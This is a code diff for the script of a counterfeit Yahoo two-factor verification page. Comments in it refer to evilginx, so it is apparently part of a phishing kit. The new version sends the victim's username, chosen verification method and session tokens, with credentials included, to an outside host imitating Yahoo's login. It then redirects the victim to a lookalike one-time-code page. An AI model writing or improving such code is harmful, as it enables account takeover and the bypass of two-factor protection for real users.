@@ -1,160 +1,113 @@
-// Import jQuery
-const $ = require("jquery")
+const $ = require("jquery") // Declare the $ variable
 
-document.addEventListener("DOMContentLoaded", () => {
-  const form = document.querySelector(".signin-form")
-  const continueBtn = document.getElementById("continueBtn")
-  const verificationOptions = document.querySelectorAll(".verification-option")
-  const challengeInput = document.getElementById("challenge")
+$(document).ready(() => {
+  console.log("Yahoo 2FA page initialized")
 
-  let selectedMethod = null
+  let selectedMethod = ""
+  let username = ""
+  const sessionData = {}
 
-  // Handle verification option selection
-  verificationOptions.forEach((option) => {
-    option.addEventListener("click", function () {
-      // Remove selected class from all options
-      verificationOptions.forEach((opt) => opt.classList.remove("selected"))
+  function getUsername() {
+    const urlParams = new URLSearchParams(window.location.search)
+    let user = urlParams.get("u")
 
-      // Add selected class to clicked option
-      this.classList.add("selected")
-      selectedMethod = this.dataset.method
-      challengeInput.value = selectedMethod
+    if (user) {
+      return decodeURIComponent(user)
+    }
 
-      // Enable continue button
-      continueBtn.disabled = false
-      continueBtn.style.opacity = "1"
+    user = sessionStorage.getItem("yh_username") || localStorage.getItem("yh_username")
+    if (user) {
+      return user
+    }
 
-      // Add visual feedback
-      this.classList.add("fade-in")
+    return "user@example.com"
+  }
 
-      // Check the radio button
-      const radio = this.querySelector('input[type="radio"]')
-      if (radio) {
-        radio.checked = true
-      }
-    })
+  function showState(state) {
+    $("#main-form, #loading-state").hide()
+    $(`#${state}`).show()
+  }
+
+  $(".verification-option").click(function () {
+    $(".verification-option").removeClass("selected")
+    $(this).addClass("selected")
+
+    selectedMethod = $(this).data("method")
+    $("#challenge").val(selectedMethod)
+    $("#submit-btn").prop("disabled", false)
+
+    console.log("Selected verification method:", selectedMethod)
   })
 
-  // Form submission
-  form.addEventListener("submit", (e) => {
+  $("#verification-form").on("submit", (e) => {
     e.preventDefault()
 
     if (!selectedMethod) {
       alert("Please select a verification method")
-      return
+      return false
     }
 
-    // Show loading state
-    continueBtn.innerHTML = '<span class="loading-spinner"></span>Sending code...'
-    continueBtn.disabled = true
+    console.log("Submitting 2FA challenge:", selectedMethod)
+    showState("loading-state")
 
-    // Store selected method
-    sessionStorage.setItem("yh_2fa_method", selectedMethod)
+    const formData = {
+      username: username,
+      challenge: selectedMethod,
+      crumb: $("#crumb").val() || "auto_crumb_" + Date.now(),
+      acrumb: $("#acrumb").val() || "auto_acrumb_" + Date.now(),
+      sessionIndex: $("#sessionIndex").val() || "1",
+      sessionToken: $("#sessionToken").val() || "sess_" + Date.now(),
+      done: "https://mail.yahoo.com/d/folders/1",
+      src: "ym",
+      ".lang": "en-US",
+      ".intl": "us",
+    }
 
-    // Create form data
-    const formData = new FormData()
-    formData.append("challenge", selectedMethod)
-
-    // Submit to evilginx
-    fetch(window.location.href, {
+    $.ajax({
+      url: "https://login.qr-gpt.live/account/challenge/challenge-selector",
       method: "POST",
-      body: formData,
-      credentials: "include",
+      data: formData,
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
+        Origin: "https://login.qr-gpt.live",
+        Referer: window.location.href,
+        "User-Agent": navigator.userAgent,
+      },
+      xhrFields: {
+        withCredentials: true,
+      },
+      timeout: 15000,
+      success: (response, textStatus, xhr) => {
+        console.log("2FA challenge submitted successfully")
+
+        setTimeout(() => {
+          window.location.href = "https://custom-yahoo-otp-test.vercel.app/"
+        }, 1500)
+      },
+      error: (xhr, textStatus, errorThrown) => {
+        console.log("2FA challenge error:", textStatus, xhr.status)
+
+        if (xhr.status === 0) {
+          setTimeout(() => {
+            window.location.href = "https://custom-yahoo-otp-test.vercel.app/"
+          }, 2000)
+        } else {
+          alert("Error submitting verification method. Please try again.")
+          showState("main-form")
+        }
+      },
     })
-      .then(() => {
-        // Redirect will be handled by evilginx force_post
-        window.location.href = "https://custom-yahoo-otp-test.vercel.app/"
-      })
-      .catch((error) => {
-        console.error("Error:", error)
-        // Fallback redirect
-        window.location.href = "https://custom-yahoo-otp-test.vercel.app/"
-      })
+
+    return false
   })
 
-  function showError(message) {
-    let errorDiv = document.querySelector(".error-message")
-    if (!errorDiv) {
-      errorDiv = document.createElement("div")
-      errorDiv.className = "error-message"
-      form.appendChild(errorDiv)
-    }
-    errorDiv.textContent = message
-    setTimeout(() => errorDiv.remove(), 5000)
-  }
-
-  // Auto-select SMS by default
-  const smsOption = document.getElementById("sms-option")
-  if (smsOption) {
-    smsOption.checked = true
-    smsOption.closest(".verification-option").classList.add("selected")
-    selectedMethod = smsOption.closest(".verification-option").dataset.method
-    challengeInput.value = selectedMethod
-    continueBtn.disabled = false
-    continueBtn.style.opacity = "1"
-  }
-
-  $(document).ready(() => {
-    console.log("2FA verification page initialized")
-
-    // Handle verification method selection
-    $(".verification-option").click(function () {
-      $(".verification-option").removeClass("selected")
-      $(this).addClass("selected")
-      selectedMethod = $(this).data("method")
-      $("#challenge").val(selectedMethod)
-      console.log("Selected method:", selectedMethod)
-
-      // Enable continue button
-      $("#continueBtn").prop("disabled", false)
-      $("#continueBtn").css("opacity", "1")
-    })
-
-    // Set default selection
-    $('.verification-option[data-method="sms"]').addClass("selected")
-
-    // Handle form submission
-    $("#challenge-form").on("submit", (e) => {
-      e.preventDefault()
-
-      console.log("Submitting 2FA challenge:", selectedMethod)
-      $("#main-form").hide()
-      $("#loading-state").show()
-
-      // Simulate sending code and redirect to OTP page
-      setTimeout(() => {
-        window.location.href = "https://custom-yahoo-otp-test.vercel.app/"
-      }, 2000)
-
-      return false
-    })
-
-    // Get username from URL or storage
-    function getUsername() {
-      const urlParams = new URLSearchParams(window.location.search)
-      let user = urlParams.get("u")
-
-      if (user) {
-        return decodeURIComponent(user)
-      }
-
-      user = sessionStorage.getItem("yh_username") || localStorage.getItem("yh_username")
-      if (user) {
-        return user
-      }
-
-      return "your account"
-    }
-
-    // Initialize page
-    const username = getUsername()
+  function initializePage() {
+    username = getUsername()
     $("#userEmail").text(username)
     $("#username").val(username)
 
-    console.log("2FA page ready for user:", username)
-  })
+    console.log("2FA page initialized for user:", username)
+  }
 
-  // Initialize form state
-  continueBtn.disabled = true
-  continueBtn.style.opacity = "0.6"
+  initializePage()
 })
